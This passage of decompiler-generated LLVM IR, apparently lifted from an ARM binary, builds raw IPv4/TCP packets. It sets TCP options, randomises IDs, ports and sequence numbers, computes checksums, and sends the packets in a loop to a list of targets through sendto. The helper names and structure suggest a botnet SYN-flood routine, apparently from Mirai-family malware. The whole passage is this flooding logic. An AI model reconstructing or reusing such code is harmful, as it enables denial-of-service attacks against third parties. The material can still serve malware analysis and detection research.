  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v1_b378 = and i32 %v3_b374, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v5_b37c = or i32 %v1_b378, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
  %v3_b3bc = inttoptr i32 %v2_b3bc to i32*
  store i32 %v0_b3a4, i32* %v3_b3bc, align 4
  %v0_b3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b3c0 = add i32 %v1_b3c0, 52
  %v3_b3c0 = inttoptr i32 %v2_b3c0 to i32*
  store i32 %v0_b3c0, i32* %v3_b3c0, align 4
  %v0_b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3c4 = trunc i32 %v0_b3c4 to i8
  %v2_b3c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c4 = add i32 %v2_b3c4, 56
  %v4_b3c4 = inttoptr i32 %v3_b3c4 to i8*
  store i8 %v1_b3c4, i8* %v4_b3c4, align 1
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 58
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b3cc = add i32 %v2_b3cc, 57
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v3_b3d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3d0, i32* %r3.global-to-local, align 4
  %v1_b3d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v1_b3d4, %v3_b3d0
  store i32 %v2_b3d4, i32* @r4, align 4
  %v1_b3d8 = load i32, i32* @r7, align 4
  %v9_b3d8 = icmp eq i32 %v2_b3d4, %v1_b3d8
  store i1 %v9_b3d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b3d4, i32* %stack_var_-44, align 4
  %v5_b3e0 = icmp slt i32 %v2_b3d4, %v1_b3d8
  br i1 %v5_b3e0, label %dec_label_pc_b228, label %dec_label_pc_b3e4.preheader

dec_label_pc_b3e4.preheader:                      ; preds = %bb61, %dec_label_pc_b158
  %v0_b3e86 = phi i32 [ 0, %dec_label_pc_b158 ], [ %v1_b3d8, %bb61 ]
  %v3_b560 = icmp eq i32 %v6_b10c, -1
  %v8_b560 = icmp eq i32 %v6_b10c, -1
  %v9_b57c = icmp eq i32 %v3_b174, ptrtoint (i16* @global_var_ffff.60 to i32)
  %v9_b43c = icmp eq i32 %v3_b178, ptrtoint (i16* @global_var_ffff.60 to i32)
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4, %dec_label_pc_b3e4.preheader
  %v0_b3e8 = phi i32 [ %v0_b3e86, %dec_label_pc_b3e4.preheader ], [ 0, %dec_label_pc_b4f4 ], [ 0, %dec_label_pc_b3e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b3f4
  %v1_b408 = phi i32 [ %v1_b4e4, %dec_label_pc_b470 ], [ 0, %dec_label_pc_b3f4 ]
  %v5_b3fc = mul i32 %v1_b408, 24
  %v1_b400 = load i32, i32* @r8, align 4
  %v2_b400 = add i32 %v1_b400, %v5_b3fc
  store i32 %v2_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b400, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @sb, align 4
  %v4_b408 = mul i32 %v1_b408, 4
  %v5_b408 = add i32 %v0_b408, %v4_b408
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  store i32 %v7_b408, i32* @r5, align 4
  %v7_b40c = icmp eq i8 %v3_b404, 31
  store i1 %v7_b40c, i1* %cpsr_z.global-to-local, align 1
  %v1_b410 = add i32 %v7_b408, 20
  store i32 %v1_b410, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b404, 32
  br i1 %tmp67, label %dec_label_pc_b508, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3f8
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  store i1 %v9_b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b43c, label %dec_label_pc_b598, label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b584.dec_label_pc_b444_crit_edge, %dec_label_pc_b438
  %v1_b448 = phi i32 [ %v1_b448.pre, %dec_label_pc_b584.dec_label_pc_b444_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_b438 ]
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v9_b448 = icmp eq i32 %v3_b17c, %v1_b448
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b448, label %dec_label_pc_b5ac, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b598.dec_label_pc_b450_crit_edge, %dec_label_pc_b444
  %v1_b454 = phi i32 [ %v1_b454.pre, %dec_label_pc_b598.dec_label_pc_b450_crit_edge ], [ %v1_b448, %dec_label_pc_b444 ]
  store i32 %v7_b048, i32* %r3.global-to-local, align 4
  %v9_b454 = icmp eq i32 %v7_b048, %v1_b454
  store i1 %v9_b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b454, label %dec_label_pc_b5c0, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge, %dec_label_pc_b450
  %v1_b460 = phi i32 [ %v1_b460.pre, %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge ], [ %v1_b454, %dec_label_pc_b450 ]
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v9_b460 = icmp eq i32 %v6_b060, %v1_b460
  store i1 %v9_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b460, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b468 = load i32, i32* @fp, align 4
  %v2_b468 = icmp eq i32 %v0_b468, 0
  store i1 %v2_b468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b468, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b470:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4, %dec_label_pc_b5e4
  %v2_b474 = load i32, i32* @r5, align 4
  %v3_b474 = add i32 %v2_b474, 10
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 0, i16* %v4_b474, align 2
  %v0_b478 = load i32, i32* @r5, align 4
  store i32 %v0_b478, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b480 = call i32 @checksum_generic(i32 %v0_b478, i32 20)
  %v3_b480 = trunc i32 %v2_b480 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 10
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v3_b480, i16* %v5_b488, align 2
  %v0_b48c = load i32, i32* @r6, align 4
  store i32 %v0_b48c, i32* @r1, align 4
  %v0_b490 = load i32, i32* %r2.global-to-local, align 4
  %v1_b490 = trunc i32 %v0_b490 to i16
  %v3_b490 = add i32 %v0_b48c, 16
  %v4_b490 = inttoptr i32 %v3_b490 to i16*
  store i16 %v1_b490, i16* %v4_b490, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = call i32 @checksum_tcpudp(i32 %v0_b49c, i32 %v0_b48c, i32 10240, i32 40)
  %v5_b4a0 = trunc i32 %v4_b4a0 to i16
  store i32 %v4_b4a0, i32* %r0.global-to-local, align 4
  %v3_b4a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a4, i32* %r3.global-to-local, align 4
  %v3_b4a8 = mul i32 %v3_b4a4, 32
  store i32 %v3_b4a8, i32* %lr.global-to-local, align 4
  %v3_b4ac = load i32, i32* @r6, align 4
  %v4_b4ac = add i32 %v3_b4ac, 16
  %v5_b4ac = inttoptr i32 %v4_b4ac to i16*
  store i16 %v5_b4a0, i16* %v5_b4ac, align 2
  %v0_b4b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b4b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b4b0, -8
  %v5_b4b0 = add i32 %v0_b4b0, %tmp68
  store i32 %v5_b4b0, i32* %lr.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r6, align 4
  %v1_b4b4 = add i32 %v0_b4b4, 2
  %v2_b4b4 = inttoptr i32 %v1_b4b4 to i16*
  %v3_b4b4 = load i16, i16* %v2_b4b4, align 2
  %v4_b4b4 = zext i16 %v3_b4b4 to i32
  store i32 %v4_b4b4, i32* @r6, align 4
  %v1_b4b8 = load i32, i32* @r8, align 4
  %v2_b4b8 = add i32 %v1_b4b8, %v5_b4b0
  store i32 %v2_b4b8, i32* @lr, align 4
  %v3_b4bc = add i32 %v2_b4b8, 2
  %v4_b4bc = inttoptr i32 %v3_b4bc to i16*
  store i16 %v3_b4b4, i16* %v4_b4bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  %v0_b4cc = load i32, i32* @sl, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @lr, align 4
  %v6_b4dc = call i32 @__libc_sendto(i32 %v0_b4cc, i32 %v0_b4c8, i32 60, i32 16384, i32 %v0_b4d4, i32 16)
  %v3_b4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4e0, i32* %r3.global-to-local, align 4
  %v1_b4e4 = add i32 %v3_b4e0, 1
  store i32 %v1_b4e4, i32* %r0.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r7, align 4
  %v9_b4e8 = icmp eq i32 %v1_b4e4, %v1_b4e8
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4e4, i32* %stack_var_-44, align 4
  %v5_b4f0 = icmp slt i32 %v1_b4e4, %v1_b4e8
  br i1 %v5_b4f0, label %dec_label_pc_b3f8, label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b470
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4f8 = icmp eq i32 %v1_b4e8, 0
  store i1 %v2_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4f8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b508:                                ; preds = %dec_label_pc_b3f8
  %v1_b508 = add i32 %v2_b400, 16
  %v2_b508 = inttoptr i32 %v1_b508 to i32*
  %v3_b508 = load i32, i32* %v2_b508, align 4
  store i32 %v3_b508, i32* %r4.global-to-local, align 4
  %v0_b50c = call i32 @rand_next()
  store i32 %v0_b50c, i32* %r0.global-to-local, align 4
  %v3_b510 = load i32, i32* %stack_var_-44, align 4
  %v5_b518 = mul i32 %v3_b510, 24
  %v0_b51c = load i32, i32* %r4.global-to-local, align 4
  %v1_b51c = and i32 %v0_b51c, 16711680
  %v3_b520 = udiv i32 %v0_b51c, 16777216
  %v4_b524 = udiv i32 %v1_b51c, 256
  %v5_b524 = or i32 %v4_b524, %v3_b520
  store i32 %v5_b524, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r8, align 4
  %v2_b528 = add i32 %v1_b528, %v5_b518
  store i32 %v2_b528, i32* %r1.global-to-local, align 4
  %v1_b52c = and i32 %v0_b51c, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_b52c, i32* %r3.global-to-local, align 4
  %v1_b530 = add i32 %v2_b528, 20
  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  %v4_b534 = mul i32 %v1_b52c, 256
  %v4_b538 = mul i32 %v0_b51c, 16777216
  %v5_b534 = or i32 %v4_b534, %v4_b538
  %v5_b538 = or i32 %v5_b534, %v5_b524
  %v7_b53c = lshr i32 %v0_b50c, %v4_b530
  %v8_b53c = add i32 %v7_b53c, %v5_b538
  store i32 %v8_b53c, i32* %r2.global-to-local, align 4
  %v1_b540 = and i32 %v8_b53c, 16711680
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  %v1_b54c = and i32 %v8_b53c, 65280
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v5_b554 = call i32 @llvm.bswap.i32(i32 %v8_b53c)
  %v1_b558 = load i32, i32* @r5, align 4
  %v2_b558 = add i32 %v1_b558, 16
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v5_b554, i32* %v3_b558, align 4
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b568:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  %v0_b568 = call i32 @rand_next()
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = add i32 %v1_b570, 12
  %v3_b570 = inttoptr i32 %v2_b570 to i32*
  store i32 %v0_b568, i32* %v3_b570, align 4
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b584:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v0_b584 = call i32 @rand_next()
  %v1_b584 = trunc i32 %v0_b584 to i16
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v3_b178, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  %v3_b590 = load i32, i32* @r5, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i16*
  store i16 %v1_b584, i16* %v5_b590, align 2
  br i1 %v9_b58c, label %dec_label_pc_b598, label %dec_label_pc_b584.dec_label_pc_b444_crit_edge

dec_label_pc_b584.dec_label_pc_b444_crit_edge:    ; preds = %dec_label_pc_b584
  %v1_b448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b444

dec_label_pc_b598:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b438
  %v0_b598 = call i32 @rand_next()
  %v1_b598 = trunc i32 %v0_b598 to i16
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v1_b5a0 = load i32, i32* @r4, align 4
  %v9_b5a0 = icmp eq i32 %v3_b17c, %v1_b5a0
  store i1 %v9_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_b5a4 = load i32, i32* @r5, align 4
  %v4_b5a4 = add i32 %v3_b5a4, 20
  %v5_b5a4 = inttoptr i32 %v4_b5a4 to i16*
  store i16 %v1_b598, i16* %v5_b5a4, align 2
  br i1 %v9_b5a0, label %dec_label_pc_b5ac, label %dec_label_pc_b598.dec_label_pc_b450_crit_edge

dec_label_pc_b598.dec_label_pc_b450_crit_edge:    ; preds = %dec_label_pc_b598
  %v1_b454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b450

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b444
  %v0_b5ac = call i32 @rand_next()
  %v1_b5ac = trunc i32 %v0_b5ac to i16
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  store i32 %v7_b048, i32* %r3.global-to-local, align 4
  %v1_b5b4 = load i32, i32* @r4, align 4
  %v9_b5b4 = icmp eq i32 %v7_b048, %v1_b5b4
  store i1 %v9_b5b4, i1* %cpsr_z.global-to-local, align 1
  %v3_b5b8 = load i32, i32* @r6, align 4
  %v4_b5b8 = add i32 %v3_b5b8, 2
  %v5_b5b8 = inttoptr i32 %v4_b5b8 to i16*
  store i16 %v1_b5ac, i16* %v5_b5b8, align 2
  br i1 %v9_b5b4, label %dec_label_pc_b5c0, label %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge

dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge:    ; preds = %dec_label_pc_b5ac
  %v1_b460.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b45c

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5ac, %dec_label_pc_b450
  %v0_b5c0 = call i32 @rand_next()
  %v1_b5c4 = load i32, i32* @r6, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 4
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c4, align 4
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @r4, align 4
  %v9_b5cc = icmp eq i32 %v6_b060, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5cc, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b5d4 = call i32 @rand_next()
  store i32 %v0_b5d4, i32* %r0.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @fp, align 4
  %v2_b5d8 = icmp eq i32 %v0_b5d8, 0
  store i1 %v2_b5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_b5dc = load i32, i32* @r6, align 4
  %v2_b5dc = add i32 %v1_b5dc, 8
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v0_b5d4, i32* %v3_b5dc, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4
  %v0_b5e4 = call i32 @rand_next()
  %v1_b5e4 = trunc i32 %v0_b5e4 to i16
  store i32 %v0_b5e4, i32* %r0.global-to-local, align 4
  %v3_b5e8 = load i32, i32* @r6, align 4
  %v4_b5e8 = add i32 %v3_b5e8, 18
  %v5_b5e8 = inttoptr i32 %v4_b5e8 to i16*
  store i16 %v1_b5e4, i16* %v5_b5e8, align 2
  br label %dec_label_pc_b470

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b130
  %v0_b5f0 = load i32, i32* @sl, align 4
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v1_b5f4 = call i32 @__GI___libc_close(i32 %v0_b5f0)
  store i32 %v1_b5f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %entry, %dec_label_pc_b5f0
  %v1_b600 = phi i32 [ %v3_b120, %entry ], [ %v1_b5f4, %dec_label_pc_b5f0 ]
  store i32 %v3_af5c, i32* %r4.global-to-local, align 4
  store i32 %v24_af5c, i32* %fp.global-to-local, align 4
  store i32 %v27_af5c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b600

; uselistorder directives
  uselistorder i32 %v0_b5e4, { 1, 0 }
  uselistorder i32 %v0_b5ac, { 1, 0 }
  uselistorder i32 %v0_b598, { 1, 0 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v0_b51c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_b4e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b4b0, { 1, 0 }
  uselistorder i32 %v4_b4a0, { 1, 0 }
  uselistorder i1 %v9_b57c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_b3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b23c, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 2, 1, 0 }
  uselistorder i32 %v1_b204, { 2, 0, 1 }
  uselistorder i32 %v1_b200, { 2, 0, 1 }
  uselistorder i32 %v1_b1fc, { 2, 0, 1 }
  uselistorder i32 %v1_b1d8, { 1, 0 }
  uselistorder i32 %v3_b178, { 0, 1, 3, 2 }
  uselistorder i32 %v3_b174, { 1, 2, 0, 3 }
  uselistorder i32 %v0_b168, { 1, 0, 2 }
  uselistorder i32 %v0_b164, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b150, { 1, 0 }
  uselistorder i1 %v7_b124, { 1, 0 }
